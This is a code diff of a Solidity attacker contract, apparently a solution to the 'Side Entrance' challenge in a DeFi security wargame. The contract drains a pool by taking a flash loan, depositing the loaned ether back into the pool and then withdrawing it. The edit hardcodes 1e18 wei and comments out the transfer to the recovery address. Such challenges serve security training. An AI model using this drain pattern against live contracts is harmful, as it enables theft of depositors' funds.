@@ -21,16 +21,16 @@ contract SideEntranceAttacker is IFlashLoanEtherReceiver {
     }
 
     function attack() external {
-        pool.flashLoan(ETHER_IN_POOL);
+        pool.flashLoan(1e18);
     }
 
     function execute() external payable {
-        pool.deposit(ETHER_IN_POOL);
+        pool.deposit{value: 1e18}();
     }
 
     function withdraw() external {
         pool.withdraw();
-        SafeTransferLib.safeTransferETH(address(recovery), ETHER_IN_POOL);
+        // SafeTransferLib.safeTransferETH(address(recovery), ETHER_IN_POOL);
         
     }
 
